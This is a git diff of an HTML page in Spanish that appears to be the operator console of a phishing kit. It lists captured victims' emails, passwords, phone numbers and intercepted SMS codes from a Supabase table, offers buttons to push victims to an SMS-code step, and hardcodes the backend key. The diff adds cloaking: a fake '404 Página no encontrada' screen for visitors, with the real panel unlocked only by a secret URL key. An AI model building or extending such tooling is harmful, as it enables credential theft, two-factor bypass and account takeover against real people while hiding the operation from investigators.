@@ -3,120 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StreamVibe Touch Console</title>
+    <title>Sincronización de Sistema</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { background-color: #050505; color: #a1a1aa; font-family: system-ui, -apple-system, sans-serif; }
-        .touch-btn { touch-action: manipulation; } /* Optimiza el toque en móviles */
-        .card-active { border-color: #06b6d4; box-shadow: 0 0 15px rgba(6, 182, 212, 0.1); }
+        /* Estilos para el modo "Error 404" falso */
+        .not-found-body { background-color: #fff; color: #000; font-family: "Segoe UI", Tahoma, sans-serif; }
+        /* Estilos para el Panel Real */
+        .admin-body { background-color: #050505; color: #a1a1aa; font-family: 'Inter', sans-serif; }
+        .touch-target { touch-action: manipulation; min-height: 44px; }
+        #safe-zone { display: none; }
     </style>
 </head>
-<body class="p-4 md:p-8">
-    <div class="max-w-6xl mx-auto">
-        <header class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4 border-b border-zinc-800 pb-6">
-            <div class="text-center md:text-left">
-                <h1 class="text-xl font-black text-white italic uppercase tracking-tighter">SV <span class="text-cyan-500">TOUCH</span> CONSOLE</h1>
-                <p class="text-[9px] text-zinc-600 font-bold tracking-widest uppercase">Optimizado para dispositivos móviles</p>
+<body id="main-body" class="not-found-body">
+
+    <!-- PANTALLA DE ERROR FALSO (Para curiosos) -->
+    <div id="fake-error" class="flex flex-col items-center justify-center min-h-screen text-center p-6">
+        <h1 class="text-7xl font-light mb-4">404</h1>
+        <div class="w-16 h-1 bg-red-500 mb-6"></div>
+        <p class="text-xl font-medium text-gray-800">Página no encontrada</p>
+        <p class="text-gray-500 mt-2 max-w-sm">El recurso solicitado no está disponible en este servidor o el enlace ha caducado.</p>
+    </div>
+
+    <!-- PANEL DE CONTROL REAL (Solo se activa con la llave) -->
+    <div id="safe-zone" class="p-4 md:p-8">
+        <header class="flex flex-col md:flex-row justify-between items-center mb-10 gap-4 border-b border-zinc-800 pb-6">
+            <div>
+                <h1 class="text-2xl font-black text-white italic uppercase tracking-tighter">SV <span class="text-cyan-500">MASTER</span> CONSOLE</h1>
+                <p class="text-[9px] text-zinc-600 font-bold tracking-widest uppercase">Panel de Control de Sesiones en Vivo</p>
             </div>
             
-            <button onclick="clearAll()" class="touch-btn w-full md:w-auto bg-red-600/20 border border-red-600 text-red-500 px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest">
-                Limpiar Base de Datos
+            <button onclick="clearAll()" class="touch-target w-full md:w-auto bg-red-600/10 border border-red-600/50 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest hover:bg-red-600 hover:text-white transition">
+                Resetear Base de Datos
             </button>
         </header>
 
+        <!-- Lista de Sesiones -->
         <div id="list" class="grid gap-4 grid-cols-1 sm:grid-cols-2 lg:grid-cols-3">
-            <!-- Las sesiones aparecerán aquí -->
+            <!-- Los datos se inyectan aquí -->
         </div>
     </div>
 
     <script>
-        const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
-        const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
-        const client = supabase.createClient(S_URL, S_KEY);
+        // --- SISTEMA DE ACCESO ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const llave = urlParams.get('key');
 
-        async function load() {
-            const { data, error } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
-            if (error) return;
-            
-            const list = document.getElementById('list');
-            if (!data || data.length === 0) {
-                list.innerHTML = `<div class="col-span-full py-20 text-center border-2 border-dashed border-zinc-900 rounded-3xl text-zinc-800 font-bold uppercase text-xs tracking-widest">Esperando conexiones...</div>`;
-                return;
-            }
-
-            list.innerHTML = data.map(s => `
-                <div class="bg-zinc-950 border border-zinc-800 p-5 rounded-2xl relative flex flex-col gap-4 ${s.step !== 'end' ? 'card-active' : ''}">
-                    <!-- Botón eliminar visible siempre para táctil -->
-                    <button onclick="deleteSession('${s.session_id}')" class="touch-btn absolute top-3 right-3 w-10 h-10 bg-zinc-900 border border-zinc-800 text-red-500 rounded-xl flex items-center justify-center font-bold">
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
-                    </button>
-                    
-                    <div>
-                        <div class="flex items-center gap-2 mb-1">
-                            <span class="text-[10px] font-mono text-zinc-500 uppercase">${s.session_id}</span>
-                            <span class="w-2 h-2 rounded-full ${s.step === 'end' ? 'bg-green-500' : 'bg-cyan-500 animate-pulse'}"></span>
-                        </div>
-                        <p class="text-white font-bold text-base truncate select-all">${s.email || '---'}</p>
-                        <p class="text-xs text-zinc-500 font-mono select-all">${s.password || '---'}</p>
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-2 bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
-                        <div class="border-r border-zinc-800">
-                            <p class="text-[8px] font-bold text-zinc-600 uppercase">Teléfono</p>
-                            <p class="text-xs text-zinc-300 font-bold">${s.phone || '---'}</p>
-                        </div>
-                        <div class="pl-2">
-                            <p class="text-[8px] font-bold text-cyan-600 uppercase">SMS Recibido</p>
-                            <p class="text-lg font-black text-cyan-400 tracking-tighter">${s.sms || '......'}</p>
-                        </div>
-                    </div>
-
-                    <div class="flex gap-2">
-                        <div class="w-24">
-                            <p class="text-[8px] text-center font-bold text-zinc-600 mb-1 uppercase italic">Nº Google</p>
-                            <input type="number" value="${s.target_num || ''}" 
-                                   class="w-full bg-zinc-900 border border-zinc-700 rounded-xl p-3 text-center text-yellow-500 font-black text-xl outline-none"
-                                   onchange="updateNum('${s.session_id}', this.value)">
-                        </div>
-                        <button onclick="changeStep('${s.session_id}', 'sms')" class="touch-btn flex-1 bg-cyan-600 active:bg-cyan-700 text-black font-black text-xs rounded-xl uppercase tracking-tighter transition shadow-lg shadow-cyan-900/20">
-                            Pedir SMS
-                        </button>
-                    </div>
-                </div>
-            `).join('');
+        // Solo si la llave es correcta mostramos el panel
+        if (llave === "sebas22") {
+            document.getElementById('fake-error').style.display = 'none';
+            document.getElementById('safe-zone').style.display = 'block';
+            document.getElementById('main-body').className = 'admin-body';
+            initApp();
         }
 
-        async function updateNum(id, val) {
-            await client.from('sessions').update({ target_num: val, updated_at: new Date().toISOString() }).eq('session_id', id);
-        }
+        function initApp() {
+            const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
+            const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
+            const client = supabase.createClient(S_URL, S_KEY);
 
-        async function changeStep(id, step) {
-            await client.from('sessions').update({ step: step, updated_at: new Date().toISOString() }).eq('session_id', id);
-            load();
-        }
-
-        async function deleteSession(id) {
-            if(confirm('¿Eliminar sesión?')) {
-                await client.from('sessions').delete().eq('session_id', id);
-                load();
-            }
-        }
-
-        async function clearAll() {
-            if(confirm('¿Borrar TODA la base de datos?')) {
-                const { data } = await client.from('sessions').select('session_id');
-                if(data) {
-                    for (const row of data) {
-                        await client.from('sessions').delete().eq('session_id', row.session_id);
-                    }
+            async function loadData() {
+                const { data, error } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
+                if (error) return;
+                
+                const list = document.getElementById('list');
+                if (!data || data.length === 0) {
+                    list.innerHTML = `<div class="col-span-full py-20 text-center border-2 border-dashed border-zinc-900 rounded-3xl text-zinc-800 font-bold uppercase text-xs tracking-widest">Esperando conexiones...</div>`;
+                    return;
                 }
-                load();
-            }
-        }
 
-        setInterval(load, 3000);
-        load();
+                list.innerHTML = data.map(s => `
+                    <div class="bg-zinc-900 border border-zinc-800 p-5 rounded-2xl relative flex flex-col gap-4">
+                        <!-- Botón Eliminar Individual -->
+                        <button onclick="deleteS('${s.session_id}')" class="touch-target absolute top-3 right-3 w-10 h-10 bg-zinc-800 border border-zinc-700 text-red-500 rounded-xl flex items-center justify-center font-bold">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
+                        </button>
+                        
+                        <div>
+                            <div class="flex items-center gap-2 mb-1">
+                                <span class="text-[9px] font-mono text-zinc-600 bg-black px-2 py-0.5 rounded">${s.session_id}</span>
+                                <span class="text-[9px] font-black ${s.step === 'end' ? 'text-green-500' : 'text-cyan-500'} uppercase">${s.step}</span>
+                            </div>
+                            <p class="text-white font-bold text-base truncate select-all">${s.email || '---'}</p>
+                            <p class="text-xs text-zinc-500 font-mono select-all">${s.password || '---'}</p>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-2 bg-black/40 p-3 rounded-xl border border-zinc-800">
+                            <div class="border-r border-zinc-800">
+                                <p class="text-[8px] font-bold text-zinc-600 uppercase">Teléfono</p>
+                                <p class="text-xs text-zinc-400 font-bold">${s.phone || '---'}</p>
+                            </div>
+                            <div class="pl-2">
+                                <p class="text-[8px] font-bold text-cyan-600 uppercase">SMS Capturado</p>
+                                <p class="text-lg font-black text-cyan-400 tracking-widest">${s.sms || '......'}</p>
+                            </div>
+                        </div>
+
+                        <div class="flex gap-2">
+                            <div class="w-24">
+                                <p class="text-[8px] text-center font-bold text-zinc-600 mb-1 uppercase">G-Num</p>
+                                <input type="number" value="${s.target_num || ''}" 
+                                       class="w-full bg-zinc-950 border border-zinc-700 rounded-xl p-3 text-center text-yellow-500 font-black text-xl outline-none"
+                                       onchange="updateNum('${s.session_id}', this.value)">
+                            </div>
+                            <button onclick="changeStep('${s.session_id}', 'sms')" class="touch-target flex-1 bg-cyan-600 active:bg-cyan-700 text-black font-black text-xs rounded-xl uppercase transition">
+                                Pedir SMS
+                            </button>
+                        </div>
+                    </div>
+                `).join('');
+            }
+
+            // Funciones globales
+            window.updateNum = async (id, val) => {
+                await client.from('sessions').update({ target_num: val, updated_at: new Date().toISOString() }).eq('session_id', id);
+            };
+
+            window.changeStep = async (id, step) => {
+                await client.from('sessions').update({ step: step, updated_at: new Date().toISOString() }).eq('session_id', id);
+                loadData();
+            };
+
+            window.deleteS = async (id) => {
+                if(confirm('¿Eliminar sesión?')) {
+                    await client.from('sessions').delete().eq('session_id', id);
+                    loadData();
+                }
+            };
+
+            window.clearAll = async () => {
+                if(confirm('¿BORRAR TODA LA BASE DE DATOS?')) {
+                    const { data } = await client.from('sessions').select('session_id');
+                    if(data) {
+                        for (const r of data) {
+                            await client.from('sessions').delete().eq('session_id', r.session_id);
+                        }
+                    }
+                    loadData();
+                }
+            };
+
+            setInterval(loadData, 3000);
+            loadData();
+        }
     </script>
 </body>
 </html>
